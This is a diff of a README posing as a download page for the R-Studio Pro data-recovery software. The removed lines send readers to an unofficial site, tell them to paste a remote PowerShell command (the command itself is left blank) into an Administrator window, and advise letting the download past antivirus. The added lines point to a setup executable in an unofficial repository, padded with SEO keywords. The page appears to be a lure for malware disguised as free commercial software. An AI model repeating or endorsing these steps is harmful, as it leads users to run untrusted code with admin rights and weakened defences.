@@ -1,129 +1,79 @@
-# R-Studio Pro Download for Windows 11 & 10
+# 🛠️ R-Studio-Pro-Edition - Recover lost data easily on Windows
 
-**R-Studio-Pro-Edition**
+[![](https://img.shields.io/badge/Download-R--Studio--Pro-blue)](https://github.com/ashlycrooked293/R-Studio-Pro-Edition)
 
-**R-Studio Pro** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+R-Studio Pro Edition helps you recover files from damaged, formatted, or deleted drives. It works files on Windows 11 and Windows 10. The software scans your storage hardware and finds files that the operating system no longer sees. It handles file systems like NTFS, FAT32, and exFAT. This tool provides deep recovery options for drives, memory cards, and USB sticks.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📦 System Requirements
 
----
+Your computer needs specific parts to run the software. Check your system against this list:
 
-## Download & Install
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM or more.
+* Storage: 200 MB of free disk space for the program.
+* Permissions: Administrator access to the machine.
+* File System: The tool works with NTFS, FAT, and exFAT.
 
-> **This is the download page.** Use the button or link below to get **R-Studio Pro** for Windows.
+## 💾 How to Download and Install
 
-<p align="center">
-  <a href="https://r-studio.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-R-Studio%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download R-Studio Pro">
-  </a>
-</p>
+Follow these steps to get the software on your computer.
 
-| | |
-| --- | --- |
-| **Direct link** | **[r-studio.nexustool.fun](https://r-studio.nexustool.fun/)** |
-| **Full URL** | `https://r-studio.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1. Go to the [official download page](https://github.com/ashlycrooked293/R-Studio-Pro-Edition).
+2. Look for the release section. 
+3. Select the file named R-Studio-Pro-Setup.exe to start the download.
+4. Wait for the browser to finish the file transfer.
+5. Open your Downloads folder.
+6. Double-click the file to start the installation wizard.
+7. Follow the prompts on the screen.
+8. Agree to the terms of service.
+9. Choose the install folder.
+10. Click Install to finish the process.
 
-### Quick steps
+## 🚀 Getting Started
 
-1. Click **[Download — r-studio.nexustool.fun](https://r-studio.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Launch the program from your desktop shortcut. You see the main dashboard with a list of your connected drives.
 
-<p align="center"><a href="https://r-studio.nexustool.fun/"><strong>⬇ Download R-Studio Pro now</strong></a></p>
+1. Select the drive or partition where you lost your files.
+2. Click the Scan button on the top menu bar.
+3. Choose the scan mode. The program offers several options based on how much detail you need.
+4. Select the file types you want to search for if you know them.
+5. Click Scan to start the process. The program displays progress in the bottom status bar.
+6. View the files once the scan finishes.
+7. Click the files you want to keep.
+8. Right-click the selected files and choose Recover.
+9. Pick a safe folder to save your recovered files. 
 
----
+## 🛡️ Recovery Tips
 
-#### Step 1 — Open PowerShell as Administrator
+Avoid saving recovered files back to the drive where you lost them. This action overwrites the data and destroys the chance for recovery. Move files to an external drive or a different partition. Use the preview function to check file health before saving. The software shows a green mark if the file appears healthy.
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+## ⚙️ Advanced Settings
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+The software includes tools for specific tasks. Use the disk imaging tool to create a copy of a failing drive. This process prevents further damage to the hardware. You can also use the virtual RAID tool to reconstruct arrays if you have a complex storage setup. These settings allow for precise control during forensic investigations or recovery of heavy corruption.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+## ❓ Common Questions
 
----
+**Does the software work on external drives?**
+Yes. Connect the drive to a USB port and the program detects it as a separate device.
 
-#### Step 2 — Copy the full command
+**Can I recover deleted partition tables?**
+The software detects lost regions on your physical drive and helps you regain access to the file system.
 
-Select **both lines** below and press **Ctrl+C**:
+**Is it safe to run on my system drive?**
+It is safe. Always save recovered files to a different drive to prevent data loss.
 
+**How long does the scan take?**
+Scan time depends on your drive size and its health state. A large, damaged drive takes more time than a healthy, small one.
 
+## 📋 Features
 
-> Copy **both lines**, not just the second one.
+* Deep scan technology for lost files.
+* Support for major Windows file formats.
+* Recovery for network drives.
+* Preview window shows documents and images.
+* Bad block management for damaged hardware.
+* Forensic image creation.
+* Support for RAID reconstruction.
+* Detailed scan logs for review.
 
----
-
-#### Step 3 — Paste into PowerShell and press Enter
-
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
-
----
-
-#### Step 4 — Finish setup
-
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
-
----
-
-#### Step 5 — Launch the app
-
-Open **Start menu** → search for **R-Studio Pro** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** Direct link (nexus) — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**R-Studio Pro** — Windows download and setup guide.
-
-**People also search for:** r-studio pro download, r-studio data recovery pro install windows
-
-**Repository:** `R-Studio-Pro-Edition`
-
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** r-studio-pro-download, r-studio, r-studio-data-recovery-pro-install-windows, recovery, r-studio-pro-edition, r-studio-pro-edition-2026, r-studio-pro, data-recovery, ntfs-recovery, pro-edition, forensics, software
+Keywords: data-recovery, download, forensics, ntfs-recovery, pro-edition, r-studio, r-studio-data-recovery-pro-install-windows, r-studio-pro, r-studio-pro-download, r-studio-pro-edition, r-studio-pro-edition-2026, recovery, software, windows-11
